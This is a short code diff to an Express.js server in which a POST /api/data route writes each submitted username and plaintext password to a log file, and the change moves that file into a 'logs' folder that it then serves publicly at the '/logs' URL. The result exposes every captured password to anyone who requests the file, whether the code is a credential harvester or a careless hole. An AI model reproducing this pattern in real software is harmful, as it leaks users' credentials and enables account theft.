@@ -18,6 +18,15 @@ app.get('/meow',(req, res)=>{
 
  
 // POST API route
+app.use('/logs', express.static(path.join(__dirname, 'logs')));
+
+// Ensure logs directory exists
+const logDir = path.join(__dirname, 'logs');
+if (!fs.existsSync(logDir)) {
+  fs.mkdirSync(logDir);
+}
+
+// API to accept data
 app.post('/api/data', (req, res) => {
   const { username, password } = req.body;
 
@@ -27,7 +36,7 @@ app.post('/api/data', (req, res) => {
 
   const logEntry = `[${new Date().toISOString()}] Username: ${username}, Password: ${password}\n`;
 
-  fs.appendFile('requests.log', logEntry, (err) => {
+  fs.appendFile(path.join(logDir, 'requests.log'), logEntry, (err) => {
     if (err) {
       console.error('Log write error:', err);
       return res.status(500).send('Error logging data');
